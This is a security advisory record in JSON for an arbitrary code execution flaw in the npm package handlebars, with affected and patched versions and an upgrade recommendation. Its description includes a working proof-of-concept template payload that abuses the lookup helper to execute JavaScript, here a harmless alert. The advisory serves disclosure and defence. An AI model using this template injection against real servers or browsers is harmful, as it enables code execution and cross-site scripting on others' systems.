{
    "Title": "Arbitrary Code Execution in handlebars",
    "Meta": {
        "Package": [
            "handlebars([npm](/advisories?query=ecosystem%3Anpm))"
        ],
        "Affected versions": [
            "< 3.0.8",
            ">= 4.0.0, < 4.5.2"
        ],
        "Patched versions": [
            "3.0.8",
            "4.5.2"
        ]
    },
    "Description": "Versions of `handlebars` prior to 3.0.8 or 4.5.2 are vulnerable to Arbitrary\nCode Execution. The package's lookup helper fails to properly validate\ntemplates, allowing attackers to submit templates that execute arbitrary\nJavaScript in the system. It can be used to run arbitrary code in a server\nprocessing Handlebars templates or on a victim's browser (effectively serving\nas Cross-Site Scripting).\n\nThe following template can be used to demonstrate the vulnerability:\n\n    \n    \n    \t{{#with split as |a|}}\n    \t\t{{pop (push \"alert('Vulnerable Handlebars JS');\")}}\n    \t\t{{#with (concat (lookup join (slice 0 1)))}}\n    \t\t\t{{#each (slice 2 3)}}\n    \t\t\t\t{{#with (apply 0 a)}}\n    \t\t\t\t\t{{.}}\n    \t\t\t\t{{/with}}\n    \t\t\t{{/each}}\n    \t\t{{/with}}\n    \t{{/with}}\n    {{/with}}```\n    \n    \n    ## Recommendation\n    \n    Upgrade to version 3.0.8, 4.5.2 or later.\n    ### References\n    - https://www.npmjs.com/advisories/1316\n    \n\n",
    "Severity": {
        "Score": "(High)"
    },
    "Weaknesses": [],
    "CVE ID": "No known CVE",
    "GHSA ID": "GHSA-2cf5-4w76-r9qv",
    "Source code": "No known source code"
}